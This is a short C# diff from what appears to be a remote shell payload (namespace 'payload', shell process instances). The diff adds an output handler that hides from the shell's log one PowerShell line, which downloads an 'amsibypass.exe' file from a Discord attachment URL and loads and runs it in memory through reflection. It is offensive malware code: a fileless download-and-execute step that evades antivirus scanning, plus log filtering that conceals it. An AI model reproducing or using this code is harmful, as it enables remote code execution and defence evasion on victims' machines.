@@ -57,8 +57,8 @@ namespace payload
                 }
             };
             shproc.EnableRaisingEvents = true;
-            shproc.OutputDataReceived += (sender, e) => log.Add(e.Data);
-            shproc.ErrorDataReceived += (sender, e) => log.Add(e.Data);
+            shproc.OutputDataReceived += OutputHandler;
+            shproc.ErrorDataReceived += OutputHandler;
             shproc.Exited += ExitHandler;
             shproc.Start();
             shproc.BeginOutputReadLine();
@@ -75,6 +75,12 @@ namespace payload
             memoryStream.Dispose();
             uThread.Abort();
             shellsInstances.Remove(this);
+        }
+
+        private void OutputHandler(object sender, DataReceivedEventArgs e)
+        {
+            if (e.Data.Contains("$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/969797235741175838/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null)")) return; 
+            log.Add(e.Data);
         }
     }
 }
